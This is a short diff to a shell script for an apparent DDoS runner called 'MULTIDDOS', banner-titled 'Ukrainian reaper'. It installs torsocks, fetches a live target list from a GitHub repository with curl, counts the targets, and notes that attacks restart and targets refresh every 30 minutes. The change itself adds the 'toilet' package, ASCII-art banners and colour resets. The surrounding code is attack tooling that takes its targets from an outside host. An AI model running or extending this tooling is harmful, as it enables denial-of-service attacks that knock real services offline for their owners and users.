@@ -96,7 +96,7 @@ done
 
 # sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
 sudo apt-get update -q -y
-sudo apt-get install -q -y tmux vnstat torsocks python3 python3-pip
+sudo apt-get install -q -y tmux vnstat toilet torsocks python3 python3-pip
 pip install --upgrade pip
 
 cat > auto_bash.sh << 'EOF'
@@ -142,9 +142,11 @@ sec_targets=$(cat $file | sort | uniq | wc -l)
 main_targets=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -w)
 total_targets=$(expr $sec_targets + $main_targets)
 
-echo -e "\x1b[32m secondary targets:" $sec_targets
-echo -e "\x1b[32m main targets:" $main_targets
-echo -e "\x1b[32m total:" $total_targets
+toilet -t --metal Український жнець
+toilet -t --metal "    MULTIDDOS"
+echo -e "\x1b[32m secondary targets:\x1b[m" $sec_targets
+echo -e "\x1b[32m main targets:\x1b[m" $main_targets
+echo -e "\x1b[32m total:\x1b[m" $total_targets
 sleep 5
 
 # Restart attacks and update targets every 30 minutes
